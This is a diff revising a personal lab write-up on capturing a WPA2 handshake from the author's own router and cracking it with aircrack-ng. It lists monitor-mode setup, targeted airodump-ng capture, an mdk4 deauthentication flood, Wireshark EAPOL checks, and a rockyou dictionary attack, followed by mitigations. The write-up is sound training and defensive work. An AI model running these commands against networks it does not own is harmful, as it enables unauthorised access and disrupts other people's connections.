@@ -1,85 +1,95 @@
-# WPA/WPA2 Handshake Capture & Crack with Aircrack-ng – March 20, 2026
+**WPA/WPA2 Handshake Capture and Crack with Aircrack-ng**
+- **Date: March 20, 2026**
 
-**Objective:**  
-Capture a WPA handshake from my test Wi-Fi network (ethical lab only – my own router) using Aircrack-ng suite, verify it in Wireshark, then attempt to crack the pre-shared key (PSK) using a dictionary attack with rockyou.txt wordlist.  
-This exercise combines offensive wireless techniques (Udemy ethical hacking course) with defensive understanding (Cisco Network Defence – why handshakes are vulnerable and how to mitigate).
+**Objective**
 
-**Important Ethical & Legal Note:**  
-This was performed **only on my personal test router** 
+The goal of this lab was to capture a WPA/WPA2 handshake from a controlled Wi-Fi environment, confirm the capture in Wireshark, and perform an offline dictionary attack to recover the pre-shared key.
 
-**Tools Used:**  
-- Kali Linux (latest version)  
-- Aircrack-ng suite (airodump-ng, aireplay-ng, airmon-ng, aircrack-ng)
-- Mdk4 
-- Wireshark (for packet analysis)  
-- Wireless adapter supporting monitor mode (Realtek rtl88xxcu chipset shown in screenshots)  
-- Wordlist: /usr/share/wordlists/rockyou.txt (common dictionary for testing weak passwords)  
+This exercise focuses on understanding how weak passwords can be exploited and how to reduce that risk in real environments.
 
-**Step-by-Step Process (Offensive – Capture Phase)**
+**Ethical and legal scope**
 
-1. **Prepare Monitor Mode**  
-   - Killed interfering processes:  
-   Syntax: sudo airmon-ng check kill
+All activity was carried out on a personal router using owned devices in a controlled lab setup. No external networks or third-party systems were involved.
+
+**Tools used**
+
+- Kali Linux (latest version)
+- Aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng, aircrack-ng)
+- Mdk4
+- Wireshark
+- Wireless adapter with monitor mode support (Realtek rtl88xxcu chipset)
+- Wordlist located at /usr/share/wordlists/rockyou.txt
+
+**Process**
+
+**1.** I began by preparing the wireless adapter for monitor mode. Interfering processes were stopped, then monitor mode was enabled and verified.
+
+**Bash:**
+   - sudo airmon-ng check kill
+   - sudo airmon-ng start wlan0
+   - iwconfig
+
+**2.** I scanned for nearby networks and identified the target access point from my lab setup.
+
+**Bash**
+   - sudo airodump-ng wlan0
+
+**The target network details were as follows:**
+- BSSID: 60:83:E7:47:CA:4D
+- ESSID: fatema
+- Channel: 2
+- Encryption: WPA2-PSK (CCMP)
+
+**3.** I then focused the capture on this specific network to collect the necessary packets.
+
+**Bash**
+   - sudo iwconfig wlan0 channel 2
+   - sudo airodump-ng --bssid 60:83:E7:47:CA:4D -c 2 --write 4Wayhandshake wlan0
+
+**4.** A client reconnection was triggered to generate traffic, and the handshake was successfully captured.
+
+**Bash**
+- sudo mdk4 wlan0 d -c 2
+
+**5.** To confirm the capture, I opened the file in Wireshark.
+
+**Bash**
+- Wireshark 4Wayhandshake-01.cap
+- Using the filter: eapol
+
+**6.** I observed all four EAPOL key messages exchanged between the client and the access point. This confirmed that the full 4-way handshake had been captured.
+
+**7.** With a valid handshake available, I moved on to the cracking phase using a dictionary attack.
    
-   - Enabled monitor mode:
-   Syntax: sudo airmon-ng start wlan0
+   **Bash**
+   - sudo aircrack-ng 4Wayhandshake-01.cap -w /usr/share/wordlists/rockyou.txt
 
-   - Verified with:
-   Syntax: iwconfig
+The tool processed 3777 packets and identified one WPA2 target. It tested keys at a rate of about 1732 per second. The correct key was found after reaching 16.49 percent of the wordlist.
 
- 2. **Scan & Target Network**
-    - Used airodump-ng to find target:
-    Syntax sudo airodump-ng wlan0
+**Recovered key:**
+- 123456@@
 
-    - Identified target AP:
-    BSSID: 60:83:E7:47:CA:4D
-    ESSID: fatema
-    Channel: 2
-    Encryption: WPA CCMP PSK
+The output also included the derived master key, transient key, and EAPOL HMAC values.
 
-    - Locked capture to target:
-    Syntax: sudo airodump-ng --bssid 60:83:E7:47:CA:4D -c 2 --write 4Wayhandshake wlan0
+**Defensive analysis**
 
-3. **Capture Handshake**
-    Forced reconnection (deauth not shown in these screenshots but implied earlier).
-    Result: Captured WPA handshake: 60:83:E7:47:CA:4D (top-right in airodump-ng).
+- This lab demonstrates a known weakness in WPA/WPA2-PSK networks. The 4-way handshake can be captured without needing to stay connected to the network. Once obtained, it allows offline password guessing.
 
-   - In Wireshark (opened 4Wayhandshake-01.cap):
-Filtered: eapol
-Saw 4 EAPOL Key messages (Message 1–4 of 4-way handshake)
-Source/Dest: Client ↔ AP (e.g., be:3a:d9:6a:15:13 ↔ TP-Link_47:ca:4d)
-Protocol: EAPOL
-Key info: Message 1 of 4, 2 of 4, etc.
-This confirms full 4-way handshake captured (critical for cracking).
+- If the passphrase is simple or commonly used, it can be recovered with standard wordlists.
 
-4. **Crack the Handshake (Dictionary Attack)**
-   - Used aircrack-ng to reveal password
-     Syntax: sudo aircrack-ng 4Wayhandshake-01.cap -w /usr/share/wordlists/rockyou.txt
+**Mitigation**
 
-**Output:**
-Read 3777 packets
-1 potential target (WPA PSK)
-Tested millions of keys (~1732 keys/sec)
-KEY FOUND! after ~16% progress (time left ~2 hours initially, but finished faster due to weak/test password)
-Revealed:
-KEY FOUND! [ 123456 ] (example – your actual weak/test key)
-Master Key, Transient Key, EAPOL HMAC shown
+- Use long and unpredictable passwords (Characters >10, including special characters)
+- Avoid reuse of common or dictionary-based passwords
+- Move to WPA3 where possible
+- Enable Protected Management Frames to reduce deauthentication abuse
+- Monitor wireless traffic for unusual authentication patterns
+- Use 802.1X authentication in business environments instead of shared keys
 
-**Defensive Lessons Learned (Cisco / Blue Team Perspective)**
+**Screenshots included**
 
-**Why handshakes are vulnerable:** WPA/WPA2-PSK uses 4-way EAPOL exchange to derive session keys from passphrase. If captured and passphrase is weak/common, offline dictionary attack cracks it.
-
-**Mitigations:**
-Use strong, unique passphrases (>20 chars, random)
-Enable Protected Management Frames (802.11w) to prevent deauth abuse
-Monitor for deauth floods or unusual EAPOL in SIEM/Wireless IDS
-Use enterprise auth (802.1X) instead of PSK in production
-
-
-Screenshots Included (Anonymized where needed):
-
-Monitor mode setup (airmon-ng start)
-airodump-ng targeted capture & handshake confirmation
-Wireshark EAPOL 4-way handshake packets
-airodump-ng live scan showing target AP/clients
-aircrack-ng cracking output with KEY FOUND
+- Monitor mode setup
+- Targeted packet capture with handshake confirmation
+- Wireshark view showing EAPOL messages
+- Network scan displaying access point and connected clients
+- Aircrack-ng output showing successful key recovery
